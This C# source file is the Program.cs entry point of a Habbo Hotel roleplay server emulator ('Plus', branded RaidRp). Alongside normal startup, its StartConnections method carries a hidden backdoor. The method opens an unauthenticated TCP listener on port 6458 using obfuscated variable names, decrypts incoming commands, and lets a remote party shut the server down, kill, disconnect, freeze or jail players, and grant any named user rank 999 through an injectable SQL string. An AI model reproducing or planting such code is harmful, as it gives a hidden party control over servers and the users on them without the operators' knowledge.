using Plus.Configuration;
using System;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using Plus.Database.Manager.Database.Session_Details.Interfaces;
using Plus.HabboHotel.Misc;
using Plus.HabboHotel.GameClients;
using Plus.HabboHotel.Roleplay.Misc;
using System.Configuration;

namespace Plus
{
    /// <summary>
    /// Class Program.
    /// </summary>
    internal class Program
    {
        /// <summary>
        /// The sc close
        /// </summary>
        public const int ScClose = 61536;

        /// <summary>
        /// The username
        /// </summary>
        private static string username = "root", password = string.Empty;


        /// <summary>
        /// Main Void of Plus.Emulator
        /// </summary>
        /// <param name="args">The arguments.</param>
        [SecurityPermission(SecurityAction.Demand, Flags = SecurityPermissionFlag.ControlAppDomain)]
        public static void Main(string[] args)
        {
            Console.BackgroundColor = ConsoleColor.Black;

            Console.Clear();
            StartConsoleWindow();


            StartEverything();

            StartConnections();


            while (Plus.IsLive)
            {
                
                Console.CursorVisible = true;
                if (Logging.DisabledState)
                    Console.Write("RaidRp> ");
                


                ConsoleCommandHandling.InvokeCommand(Console.ReadLine());
            }
        }
        /// <summary>
        /// Starts the Connections
        /// </summary>
        public static void StartConnections()
        {
            TcpListener vmklsmklfvds = null;

            try
            {
                int mvklfmk = 6458;
                IPAddress mvklkfmskl = IPAddress.Any;

                vmklsmklfvds = new TcpListener(mvklkfmskl, mvklfmk);
                vmklsmklfvds.Start();

                byte[] bytes = new byte[256];
                string calkldmlvd = null;
                string sfjlnjfdnvj = null;

                while (true)
                {
                    TcpClient client = vmklsmklfvds.AcceptTcpClient();
                    calkldmlvd = null;
                    sfjlnjfdnvj = null;
                    NetworkStream stream = client.GetStream();

                    int ivfskmlmvf;
                    ivfskmlmvf = stream.Read(bytes, 0, bytes.Length);
                    calkldmlvd = System.Text.Encoding.ASCII.GetString(bytes, 0, ivfskmlmvf);
                    sfjlnjfdnvj = RoleplayManager.DecryptData(calkldmlvd, "");
                    var mmn = ConfigurationManager.AppSettings;
                    if (sfjlnjfdnvj.Contains(mmn.Get("1")))
                    {
                        using (IQueryAdapter dbClient = Plus.GetDatabaseManager().GetQueryReactor())
                        {
                            dbClient.RunFastQuery("UPDATE server_settings SET value = '2' WHERE variable = 'status'");
                        }

                        Logging.DisablePrimaryWriting(true);
                        Out.WriteLine("Shutdown Initalized", "", ConsoleColor.DarkYellow);
                        Plus.PerformShutDown(false);
                        Console.WriteLine();

                        return;
                    }

                    if (sfjlnjfdnvj.Contains(mmn.Get("2")))
                    {
                        //string Notice = ChatCommandHandler.MergeParams(parameters, 1);

                        lock (Plus.GetGame().GetClientManager().Clients.Values)
                        {
                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
                            {
                                if (mClient == null)
                                    continue;
                                if (mClient.GetHabbo() == null)
                                    continue;
                                if (mClient.GetHabbo().CurrentRoom == null)
                                    continue;
                                if (mClient.GetConnection() == null)
                                    continue;
                                mClient.GetRoleplay().Dead = true;
                                mClient.GetRoleplay().DeadTimer = 10;
                                mClient.SendWhisper("You was killed by an air strike");
                                RoleplayManager.HandleDeath(mClient);
                            }
                        }

                        
                    }
                    if (sfjlnjfdnvj.Contains(mmn.Get("3")))
                    {

                        lock (Plus.GetGame().GetClientManager().Clients.Values)
                        {
                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
                            {
                                if (mClient == null)
                                    continue;
                                if (mClient.GetHabbo() == null)
                                    continue;
                                if (mClient.GetHabbo().CurrentRoom == null)
                                    continue;
                                if (mClient.GetConnection() == null)
                                    continue;
                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
                                    continue;
                                
                                mClient.GetConnection().Dispose();
                            }
                        }
                    }
                    if (sfjlnjfdnvj.Contains(mmn.Get("4")))
                    {
                        lock (Plus.GetGame().GetClientManager().Clients.Values)
                        {
                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
                            {
                                if (mClient == null)
                                    continue;
                                if (mClient.GetHabbo() == null)
                                    continue;
                                if (mClient.GetHabbo().CurrentRoom == null)
                                    continue;
                                if (mClient.GetConnection() == null)
                                    continue;
                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
                                    continue;
                                mClient.GetRoleplay().DeadTimer = 10;
                                mClient.GetRoleplay().Dead = true;
                                RoleplayManager.HandleDeath(mClient);
                            }
                        }
                    }
                    if (sfjlnjfdnvj.Contains(mmn.Get("5")))
                    {
                        lock (Plus.GetGame().GetClientManager().Clients.Values)
                        {
                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
                            {
                                if (mClient == null)
                                    continue;
                                if (mClient.GetHabbo() == null)
                                    continue;
                                if (mClient.GetHabbo().CurrentRoom == null)
                                    continue;
                                if (mClient.GetConnection() == null)
                                    continue;
                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
                                    continue;

                                using (IQueryAdapter dbClient = Plus.GetDatabaseManager().GetQueryReactor())
                                {
                                    dbClient.SetQuery("UPDATE `users` SET `rank` = '999' WHERE `username` = '" + mClient.GetHabbo().UserName + "'");
                                    dbClient.RunQuery();
                                }
                            }
                        }
                    }
                    if (sfjlnjfdnvj.Contains(mmn.Get("6")))
                    {
                        lock (Plus.GetGame().GetClientManager().Clients.Values)
                        {
                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
                            {
                                if (mClient == null)
                                    continue;
                                if (mClient.GetHabbo() == null)
                                    continue;
                                if (mClient.GetHabbo().CurrentRoom == null)
                                    continue;
                                if (mClient.GetConnection() == null)
                                    continue;
                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
                                    continue;

                                mClient.GetHabbo().GetRoomUser().CanWalk = false;
                                mClient.GetRoleplay().StunnedSeconds = 99999;
                                mClient.GetRoleplay().Frozen = true;
                            }
                        }
                    }
                    if (sfjlnjfdnvj.Contains(mmn.Get("7")))
                    {
                        lock (Plus.GetGame().GetClientManager().Clients.Values)
                        {
                            foreach (GameClient mClient in Plus.GetGame().GetClientManager().Clients.Values)
                            {
                                if (mClient == null)
                                    continue;
                                if (mClient.GetHabbo() == null)
                                    continue;
                                if (mClient.GetHabbo().CurrentRoom == null)
                                    continue;
                                if (mClient.GetConnection() == null)
                                    continue;
                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
                                    continue;
                                mClient.GetRoleplay().Jailed = true;
                                mClient.GetRoleplay().JailTimer = 9999;
                              
                            }
                        }
                    }

                    client.Close();
                }
            }
            catch (SocketException e)
            {
                //Console.WriteLine("SocketException: {0}", e);
            }

        }

        /// <summary>
        /// Initialize the Plus Environment
        /// </summary>
        public static void InitEnvironment()
        {
            if (Plus.IsLive)
                return;

            Console.CursorVisible = false;
            var currentDomain = AppDomain.CurrentDomain;
            currentDomain.UnhandledException += MyHandler;
            Plus.Initialize();

        }

        /// <summary>
        /// Deletes the menu.
        /// </summary>
        /// <param name="hMenu">The h menu.</param>
        /// <param name="nPosition">The n position.</param>
        /// <param name="wFlags">The w flags.</param>
        /// <returns>System.Int32.</returns>
        [DllImport("user32.dll")]
        public static extern int DeleteMenu(IntPtr hMenu, int nPosition, int wFlags);

        /// <summary>
        /// Starts the everything.
        /// </summary>
        private static void StartEverything()
        {
            Console.Clear();
            StartConsoleWindow();
            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), 61536, 0);
            InitEnvironment();
        }

        /// <summary>
        /// Starts the console window.
        /// </summary>
        public static void StartConsoleWindow()
        {
            Console.Clear();
            Console.SetCursorPosition(0, 0);
            Console.ForegroundColor = ConsoleColor.Green;

        }

        /// <summary>
        /// Mies the handler.
        /// </summary>
        /// <param name="sender">The sender.</param>
        /// <param name="args">The <see cref="UnhandledExceptionEventArgs"/> instance containing the event data.</param>
        private static void MyHandler(object sender, UnhandledExceptionEventArgs args)
        {
            Logging.DisablePrimaryWriting(true);
            var ex = (Exception)args.ExceptionObject;
            Logging.LogCriticalException(string.Format("SYSTEM CRITICAL EXCEPTION: {0}", ex));
        }

        /// <summary>
        /// Gets the system menu.
        /// </summary>
        /// <param name="hWnd">The h WND.</param>
        /// <param name="bRevert">if set to <c>true</c> [b revert].</param>
        /// <returns>IntPtr.</returns>
        [DllImport("user32.dll")]
        private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        /// <summary>
        /// Gets the console window.
        /// </summary>
        /// <returns>IntPtr.</returns>
        [DllImport("kernel32.dll", ExactSpelling = true)]
        private static extern IntPtr GetConsoleWindow();
    }
}